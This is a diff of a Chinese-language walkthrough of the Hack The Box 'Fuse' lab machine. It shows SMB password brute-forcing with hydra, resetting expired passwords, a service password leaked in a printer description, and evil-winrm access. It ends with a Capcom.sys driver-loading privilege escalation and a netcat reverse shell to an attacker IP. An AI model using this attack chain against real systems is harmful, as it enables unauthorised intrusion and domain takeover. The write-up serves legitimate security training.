@@ -113,8 +113,7 @@ Nmap done: 1 IP address (1 host up) scanned in 141.01 seconds
 
 ```
 
-显然是一台DC，域名：```fabricorp.local```,smb爆出一个```guest```用户
-一个个枚举
+显然是一台DC，域名：```fabricorp.local```
 
 ## web
 
@@ -122,7 +121,7 @@ Nmap done: 1 IP address (1 host up) scanned in 141.01 seconds
 ```echo "10.10.10.193   fuse.fabricorp.local">>/etc/hosts```
 
 
-80端口看起来像是一个打印机历史记录网站，收集到几个用户名,整理成一个名单
+
 另外页面下载的打印记录里显示打印机的名称是HP-MFT01,应该是一台惠普打印机
 
 5月份打印记录
@@ -145,9 +144,7 @@ Time,User,Pages,Copies,Printer,Document Name,Client,Paper Size,Language,Height,W
 
 ```
 
-
-在[这个](https://www.papercut.com/kb/Main/CommonSecurityQuestions)关于PaperCut的页面里，我们知道网站用户身份验证是通过AD进行的
-因此我们猜测打印机的账号可能是svc-print
+80端口看起来像是一个打印机历史记录网站，收集到几个用户名,整理成一个名单
 ```
 pmerton
 tlavel
@@ -161,7 +158,6 @@ LONWK015
 LONWK019
 LAPTOP07
 HP-MFT01
-svc-print
 ```
 
 ## kerberos
@@ -183,7 +179,6 @@ PORT   STATE SERVICE
 |     pmerton@fabricorp.local
 |     tlavel@fabricorp.local
 |     Fuse@fabricorp.local
-|     svc-print@fabricorp.local
 |_    bhult@fabricorp.local
 
 Nmap done: 1 IP address (1 host up) scanned in 3.60 seconds
@@ -194,6 +189,10 @@ Nmap done: 1 IP address (1 host up) scanned in 3.60 seconds
 ```
 tlavel
 bhult
+sthompson
+administrator
+pmerton
+Fuse
 ```
 
 
@@ -215,7 +214,6 @@ Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corpo
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] User svc-print doesn't have UF_DONT_REQUIRE_PREAUTH set
 
 ```
 
@@ -283,7 +281,7 @@ text: 000004DC: LdapErr: DSID-0C090A6C, comment: In order to perform this opera
 
 ```
 
-## Spray for Password
+## smb爆破
 
 用cewl命令从web上收集信息作为密码字典，爆破上面的用户列表
 ```
@@ -296,6 +294,314 @@ WARNING: Nokogiri was built against libxml version 2.9.10, but has dynamically l
 
 现在我们收集到了一个密码字典passwd.txt
 
-crackmapexec smb 10.10.10.193 -u ./user -p ./passwd.txt
+使用hydra爆破smb密码
+```
+┌──(root💀kali)-[~/htb/Fuse]
+└─# hydra -L user -P passwd.txt 10.10.10.193 smb
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-08 00:31:27
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 1183 login tries (l:7/p:169), ~1183 tries per task
+[DATA] attacking smb://10.10.10.193:445/
+[445][smb] Host: 10.10.10.193 Account: tlavel Valid password, password expired and must be changed on next logon
+[445][smb] host: 10.10.10.193   login: tlavel   password: Fabricorp01
+[445][smb] Host: 10.10.10.193 Account: bhult Valid password, password expired and must be changed on next logon
+[445][smb] host: 10.10.10.193   login: bhult   password: Fabricorp01
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-08 01:07:23
+
+```
+
+发现两个账户凭据：
+> tlavel：Fabricorp01
+> bhult：Fabricorp01
+
+尝试登陆smb，提示密码过期
+```
+┌──(root💀kali)-[~/htb/Fuse]
+└─# crackmapexec smb 10.10.10.193 -u 'tlavel' -p 'Fabricorp01' --shares
+SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.10.10.193    445    FUSE             [-] Error enumerating shares: SMB SessionError: 0x5b
+
+```
+
+tlavel和bhult的密码用smbpasswd把密码改成```Fabricorp02```
+```
+┌──(root💀kali)-[~/htb/Fuse]
+└─# smbpasswd -r 10.10.10.193  tlavel                                                                                                       1 ⨯
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+Password changed for user tlavel on 10.10.10.193.
+
+┌──(root💀kali)-[~/htb/Fuse]
+└─# smbpasswd -r 10.10.10.193  bhult                                                                                                        1 ⨯
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+Password changed for user bhult on 10.10.10.193.
+
+```
+
+或者用smbpasswd.py修改smb密码
+```
+┌──(root💀kali)-[~/htb/Fuse]
+└─# python3 /root/impacket-master/examples/smbpasswd.py  fabricorp.local/tlavel:Fabricorp01@10.10.10.193 -newpass 'Fabricorp02'
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[!] Password is expired, trying to bind with a null session.
+[*] Password was changed successfully.
+
+```
 
 
+再用新密码登录smb,看见已经可以显示分享目录
+```
+┌──(root💀kali)-[~/htb/Fuse]
+└─# crackmapexec smb 10.10.10.193 -u 'tlavel' -p 'Fabricorp02' --shares
+SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\tlavel:Fabricorp02 
+SMB         10.10.10.193    445    FUSE             [+] Enumerated shares
+SMB         10.10.10.193    445    FUSE             Share           Permissions     Remark
+SMB         10.10.10.193    445    FUSE             -----           -----------     ------
+SMB         10.10.10.193    445    FUSE             ADMIN$                          Remote Admin
+SMB         10.10.10.193    445    FUSE             C$                              Default share
+SMB         10.10.10.193    445    FUSE             HP-MFT01                        HP-MFT01
+SMB         10.10.10.193    445    FUSE             IPC$                            Remote IPC
+SMB         10.10.10.193    445    FUSE             NETLOGON        READ            Logon server share 
+SMB         10.10.10.193    445    FUSE             print$          READ            Printer Drivers
+SMB         10.10.10.193    445    FUSE             SYSVOL          READ            Logon server share 
+
+```
+
+奇怪的是，这个修改的密码通常用一次后面就不能再使用了，需要再次修改密码，而原密码还是Fabricorp01。可能是靶机作者担心原密码修改了以后影响其他人员做的某种定时任务之类的东西？
+
+但是这个密码并不能使用evil-winrm，smbexec.py，psexec.py等工具登录
+
+使用修改的凭证，登录rpcclient，拿到完整的域user名单
+
+```
+┌──(root💀kali)-[~/htb/Fuse]
+└─# rpcclient -U tlavel%Fabricorp06 10.10.10.193
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[svc-print] rid:[0x450]
+user:[bnielson] rid:[0x451]
+user:[sthompson] rid:[0x641]
+user:[tlavel] rid:[0x642]
+user:[pmerton] rid:[0x643]
+user:[svc-scan] rid:[0x645]
+user:[bhult] rid:[0x1bbd]
+user:[dandrews] rid:[0x1bbe]
+user:[mberbatov] rid:[0x1db1]
+user:[astein] rid:[0x1db2]
+user:[dmuir] rid:[0x1db3]
+rpcclient $> 
+
+```
+
+整理user list为：
+```
+Administrator
+Guest
+krbtgt
+DefaultAccount
+svc-print
+bnielson
+sthompson
+tlavel
+pmerton
+svc-scan
+bhult
+dandrews
+mberbatov
+astein
+dmuir
+```
+
+使用enumprinters枚举打印机信息，爆出一个密码：```$fab@s3Rv1ce$1```
+```
+rpcclient $> enumprinters
+        flags:[0x800000]
+        name:[\\10.10.10.193\HP-MFT01]
+        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
+        comment:[]
+
+
+```
+
+
+## Spray for Password
+
+hydra爆破这个密码匹配的用户
+```
+┌──(root💀kali)-[~/htb/Fuse]
+└─# hydra -L user -p '$fab@s3Rv1ce$1' 10.10.10.193 smb
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-08 06:16:20
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 15 login tries (l:15/p:1), ~15 tries per task
+[DATA] attacking smb://10.10.10.193:445/
+[445][smb] host: 10.10.10.193   login: svc-print   password: $fab@s3Rv1ce$1
+[445][smb] host: 10.10.10.193   login: svc-scan   password: $fab@s3Rv1ce$1
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-08 06:16:33
+
+```
+
+等到两个用户凭据：```svc-scan：$fab@s3Rv1ce$1```和```svc-print：$fab@s3Rv1ce$1```
+
+使用```svc-print：$fab@s3Rv1ce$1```拿到foodhold
+```
+┌──(root💀kali)-[~/htb/Fuse]
+└─#  evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'           123 ⨯
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                           
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                             
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-print\Documents> whoami
+fabricorp\svc-print
+
+```
+
+# 提权
+
+查看本账户权限，注意```SeLoadDriverPrivilege```
+
+谷歌搜索```seloaddriverprivilege privilege escalation```找到[这篇文章](https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
+
+这里有文章的[中文版本](https://www.anquanke.com/post/id/148227)
+
+（我理解）这个漏洞利用的原理是，SeLoadDriverPrivilege就是允许非特权用户加载驱动程序，此时如果加载的恶意的驱动程序，恶意代码就可以加载到系统的内核中执行，从而实现提权。
+
+
+```
+*Evil-WinRM* PS C:\Users\svc-print\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeLoadDriverPrivilege         Load and unload device drivers Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+```
+
+
+
+用于编译的源代码[在此](https://github.com/TarlogicSecurity/EoPLoadDriver/)
+
+
+
+但是也可以选择release版本,下载下面两个文件，上传到靶机
+[ExploitCapcom.exe](https://github.com/clubby789/ExploitCapcom/releases/download/1.0/ExploitCapcom.exe)
+[Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
+
+执行
+> .\ExploitCapcom.exe LOAD C:\Users\svc-print\Documents\Capcom.sys
+> .\ExploitCapcom.exe EXPLOIT whoami
+
+
+```
+*Evil-WinRM* PS C:\Users\svc-print\Documents> .\ExploitCapcom.exe LOAD C:\Users\svc-print\Documents\Capcom.sys
+[*] Service Name: xhqhfuts
+[+] Enabling SeLoadDriverPrivilege
+[+] SeLoadDriverPrivilege Enabled
+[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\????????????????s
+NTSTATUS: 00000000, WinError: 0
+*Evil-WinRM* PS C:\Users\svc-print\Documents> .\ExploitCapcom.exe EXPLOIT whoami
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000064
+[*] Shellcode was placed at 0000023513930008
+[+] Shellcode was executed
+[+] Token stealing was successful
+[+] Command Executed
+nt authority\system
+
+```
+
+打印出了提权后的权限
+
+传nc到靶机，使用下面payload
+
+>  .\ExploitCapcom.exe EXPLOIT "C:\Users\svc-print\Documents\nc.exe 10.10.14.5 4444 -e cmd.exe"
+
+```
+*Evil-WinRM* PS C:\Users\svc-print\Documents> .\ExploitCapcom.exe EXPLOIT "C:\Users\svc-print\Documents\nc.exe 10.10.14.5 4444 -e cmd.exe"
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000064
+[*] Shellcode was placed at 000001D17CB20008
+[+] Shellcode was executed
+[+] Token stealing was successful
+[+] Command Executed
+
+```
+
+拿到提权的反弹shell
+
+```
+┌──(root💀kali)-[~/htb/Fuse]
+└─# nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.10.193] 50179
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\svc-print\Documents>whoami
+whoami
+nt authority\system
+
+```
+
+
+# 总结
+这台foothold感觉有点ctf的味道，提权部分看其他人的walkthrough好多卡在源代码编译环节上，网上找到了相关的资源就直接拿来用了。
+
+AD部分只是出现在用户枚举，后来提权的时候用bloodhound看本账户到domain Admin的路径，本账户输入IT Account组，IT Account可以远程登录fuse.fabricorp.local电脑，这台电脑存有admin的session，理论上好像也可以提权，但是我没有验证。
+
+另外另一个账号sthompson原来是Domain Admins组成员,理论上提权到这个账号也可以成功提权，不过没找到这个账号的更多信息。
+```
+*Evil-WinRM* PS C:\Users\svc-print\Documents> net user sthompson
+User name                    sthompson
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/30/2020 3:30:57 PM
+Password expires             Never
+Password changeable          5/31/2020 3:30:57 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   5/30/2020 3:31:56 PM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *IT_Accounts
+                             *Domain Admins
+The command completed successfully.
+
+```
